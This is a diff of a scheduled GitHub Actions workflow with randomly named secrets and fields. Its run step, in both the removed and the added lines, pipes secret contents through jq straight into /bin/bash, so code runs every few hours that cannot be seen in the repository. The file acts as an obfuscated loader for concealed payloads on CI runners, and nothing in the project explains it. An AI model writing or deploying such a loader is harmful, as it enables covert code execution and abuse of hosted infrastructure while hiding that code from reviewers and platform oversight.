@@ -1,11 +1,10 @@
 name: weishenmeda
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 4/6 * * *'
+    - cron: '0 3/6 * * *'
 
-jobs:  # 4106
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,17 +12,13 @@ jobs:  # 4106
       - uses: actions/checkout@v4
       - name: weishenmeda
         env:
-          latc4479: ${{ secrets.latc4479 }}
+          atwaq4: ${{ secrets.atwaq4 }}
         run: |
-          echo $latc4479 | jq -r .lnxfe11 | /bin/bash
-          echo $rcchs86647 | jq -r .xoan0 | /bin/bash
-          echo $w8 | jq -r .d0 | /bin/bash
-          echo $hqkjy20 | jq -r .szt359 | /bin/bash
-          echo $o62374 | jq -r .cxjih67386 | /bin/bash
-          echo $z97 | jq -r .vic1406 | /bin/bash
-          echo $lhgc788 | jq -r .b46710 | /bin/bash
-          echo $xyzh99784 | jq -r .b659 | /bin/bash
-          echo $yvuz8 | jq -r .stzqn59 | /bin/bash
-          echo $oae121 | jq -r .dvz08969 | /bin/bash
-          echo $hq7 | jq -r .kbljv48382 | /bin/bash
+          echo $atwaq4 | jq -r .pep877 | /bin/bash
+          echo $mdh366 | jq -r .lgcc852 | /bin/bash
+          echo $dax65797 | jq -r .d16 | /bin/bash
+          echo $y2 | jq -r .ncx18 | /bin/bash
+          echo $o7553 | jq -r .f849 | /bin/bash
+          echo $z080 | jq -r .bgzh7 | /bin/bash
+          echo $eeu6160 | jq -r .hlwk43335 | /bin/bash
 
